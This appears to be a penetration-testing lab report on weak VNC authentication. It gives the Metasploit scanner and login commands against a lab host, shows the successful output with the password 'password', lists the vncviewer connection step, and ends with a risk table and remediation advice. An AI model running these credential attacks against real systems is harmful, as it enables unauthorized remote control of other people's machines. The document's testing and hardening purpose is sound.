# Exploitation Phase – 6. VNC Authentication Weakness

---

## Vulnerability Phase Identification

**Phase:** Exploitation  
**Vulnerability Identified During:** Scanning & Vulnerability Assessment  
**Affected Service:** Virtual Network Computing
**Service Version:** VNC Protocol 3.3
**Port:** TCP 5900  

This vulnerability was identified during service enumeration and confirmed during vulnerability assessment using Nmap 

---

## Vulnerability Overview

VNC is a remote desktop protocol that allows graphical access to a system.
If weak authentication mechanisms are enabled or default credentials are used, an attacker can gain unauthorized remote desktop access. 

### Impact
- Unauthorized graphical access to the system
- Full desktop takeover
- Credential exposure and privilege escalation
- Complete system compromise

This is considered a **critical, high-impact vulnerability**.

---

## Tool Used: Metasploit Framework

### Why This Tool Is Used
- Provides dedicated VNC authentication scanning modules
- Automates detection of weak or default credentials
- Confirms real-world exploitability
- Industry-standard penetration testing framework

### Tool Explanation
Metasploit includes auxiliary modules that test VNC services for unauthenticated access and weak password authentication, allowing attackers to validate if remote desktop access can be obtained.

---

## Exploit Module Information

Modules Used
- auxiliary/scanner/vnc/vnc_none_auth
- auxiliary/scanner/vnc/vnc_login

Exploit Type
- Authentication weakness exploitation
- Remote graphical access

---

## Exploitation Command Sequence
Step 1: Check for VNC None Authentication

    msfconsole -q
    use auxiliary/scanner/vnc/vnc_none_auth
    set RHOSTS 192.168.56.102
    exploit
Step 2: VNC Password Authentication Attack
     
    use auxiliary/scanner/vnc/vnc_login
    set RHOSTS 192.168.56.102
    exploit

## Exploit Output (Successful)

    [*] 192.168.56.102:5900 - Starting VNC login sweep
    [+] 192.168.56.102:5900 - Login Successful: :password
    [*] Scanned 1 of 1 hosts (100% complete)


## Post-Exploitation Validation
After successful authentication, the attacker can connect to the VNC service using a VNC client.
Validation Command (Attacker Machine)
vncviewer 192.168.56.102:5900
Password: password

## Findings
- VNC authentication enabled with weak/default password
- Remote desktop access obtained
- Full graphical control of the target system
- Ability to interact with applications and system processes
- Potential access to sensitive data displayed on the desktop

This confirms successful exploitation of VNC authentication weakness.

## What Was Achieved Through This Exploit
- Unauthorized VNC access obtained
- Full remote desktop control
- Ability to:
  - Monitor user activity
  - Capture credentials
  - Execute applications
  - Access sensitive files
  - Escalate privileges (if user is privileged)

## Risk Assessment
| Fctor | Severity |
|---|------|
| Weak authentication | High | 
| Remote Access | High | 
| Privilege Access | Medium | 
| Exploit Complexity | Low |
| Impact | Full system compromise |

## Remediation Recommendations
- Disable VNC service if not required
- Enforce strong, complex passwords
- Implement account lockout policies
- Use encrypted VNC variants or VPN tunneling
- Restrict VNC access using firewall rules
- Bind VNC service to localhost where possible

## Conclusion
The VNC service on the target system was vulnerable due to weak authentication credentials.
Successful exploitation allowed unauthorized remote desktop access, demonstrating how poorly secured remote access services can lead to complete system compromise.

This highlights the importance of secure authentication practices and service hardening.

---
